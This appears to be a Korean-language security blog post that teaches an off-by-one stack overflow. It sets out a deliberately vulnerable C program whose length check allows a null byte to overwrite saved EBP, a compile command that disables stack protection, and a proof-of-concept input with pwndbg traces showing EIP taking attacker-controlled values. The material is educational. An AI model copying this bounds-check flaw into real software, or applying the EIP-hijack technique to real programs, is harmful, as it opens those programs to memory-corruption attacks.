---
layout: post
title: "Off-By-One"
date: 2018-10-31
excerpt: "BOF없이 eip 조작"
tags: [tech]
comments: true
---

```c
#include <stdio.h>

int overflow(char *str)
{
    char buf[1024];
    strcpy(buf, str);
    printf("%s\r\n",buf);
}
 
int main(int argc,char *argv[])
{
    if (strlen(argv[1]) > 1024) 
    {
        printf("No Buffer Overflow!!!\n");
        return 1;
    }

    overflow(argv[1]);

    return 0;
}
```
우선 위와 같은 코드를 컴파일합니다.
```
gcc -o offbyone offbyone.c -fno-stack-protector -mpreferred-stack-boundary=2 -m32
```

argv[1]의 길이가 1024를 넘는지 확인하고, 넘는다면 BOF 방지 메시지를 띄우며 리턴합니다.

그렇지 않다면 overflow()에서 strcpy로 argv[1]을 buf로 복사하는데, 직관적으로는 BOF가 발생하지 않으며 안전한 코드로 느껴집니다.

```
~/pwn/stack/obo st4nw@trust
❯ ./offbyone `python -c 'print "A" * 1060'`
No Buffer Overflow!!!
```
실제로도 argv[1]의 길이가 1024를 넘어가면 프로그램이 정상적으로 종료됩니다. 그 다음은 정확히 1024를 넣어보겠습니다.

```
~/pwn/stack/obo st4nw@trust
❯ ./offbyone `python -c 'print "A" * 1024'`
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
[1]    29692 segmentation fault (core dumped)  ./offbyone `python -c 'print "A" * 1024'`

~/pwn/stack/obo st4nw@trust
❯ gdb -c core -q                           
pwndbg: loaded 176 commands. Type pwndbg [filter] for a list.
pwndbg: created $rebase, $ida gdb functions (can be used with print/break)
[New LWP 29692]
Core was generated by `./offbyone AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'.
Program terminated with signal SIGSEGV, Segmentation fault.
#0  0x41414141 in ?? ()
```
Segmentation Fault가 발생하며, EIP가 0x41414141(AAAA)로 조작된 것을 볼 수 있습니다. gdb로 프로그램의 작동 과정을 살펴보겠습니다.

breakpoint는 main과 overflow 함수의 각 leave에 걸었습니다.

```
pwndbg> r `python -c 'print "A" * 1024'`
.
.
.
 EAX  0x402
 EBX  0x0
 ECX  0x7ffffbff
 EDX  0xf7faf870 (_IO_stdfile_1_lock) ◂— 0x0
 EDI  0xf7fae000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1b1db0
 ESI  0xf7fae000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1b1db0
 EBP  0xffffcd8c —▸ 0xffffcd00 ◂— 0x41414141 ('AAAA')
 ESP  0xffffc98c ◂— 0x41414141 ('AAAA')
 EIP  0x80484cb (overflow+48) ◂— 0x8955c3c9
 ```
overflow의 leave 과정에서 EBP는 1024개의 A중 어딘가의 주소를 가르키고 있습니다.

```
leave
mov esp, ebp
pop ebp
```
이때 위와 같은 leave의 과정을 거치며 레지스터는 다음과 같아집니다.
```
 EAX  0x402
 EBX  0x0
 ECX  0x7ffffbff
 EDX  0xf7faf870 (_IO_stdfile_1_lock) ◂— 0x0
 EDI  0xf7fae000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1b1db0
 ESI  0xf7fae000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1b1db0
 EBP  0xffffcd00 ◂— 0x41414141 ('AAAA')
 ESP  0xffffcd90 —▸ 0x804850a (main+61) ◂— 0xb804c483
 EIP  0x80484cc (overflow+49) ◂— 0xe58955c3
```
이제 EBP는 AAAA의 직접적인 주소를 저장하게되고 ret을 진행합니다.

여기서 main에서 leave가 한번 더 진행되며 문제가 발생하게 됩니다.
```
 EAX  0x0
 EBX  0x0
 ECX  0x7ffffbff
 EDX  0xf7faf870 (_IO_stdfile_1_lock) ◂— 0x0
 EDI  0xf7fae000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1b1db0
 ESI  0xf7fae000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1b1db0
 EBP  0x41414141 ('AAAA')
 ESP  0xffffcd04 ◂— 0x41414141 ('AAAA')
 EIP  0x8048513 (main+70) ◂— 0x669066c3
 ```
 pop ebp로 EBP가 가지고 있던 값인 AAAA가 EBP에 직접 들어가게되고, ret을 할 때 AAAA를 base로 리턴시키게 됩니다.
 ```
  EAX  0x0
 EBX  0x0
 ECX  0x7ffffbff
 EDX  0xf7faf870 (_IO_stdfile_1_lock) ◂— 0x0
 EDI  0xf7fae000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1b1db0
 ESI  0xf7fae000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1b1db0
 EBP  0x41414141 ('AAAA')
 ESP  0xffffcd08 ◂— 0x41414141 ('AAAA')
 EIP  0x41414141 ('AAAA')
```
ret 이후 예상대로 EIP에는 0x41414141의 값이 들어가게 되며 Segmentation Fault가 발생하게 됩니다.
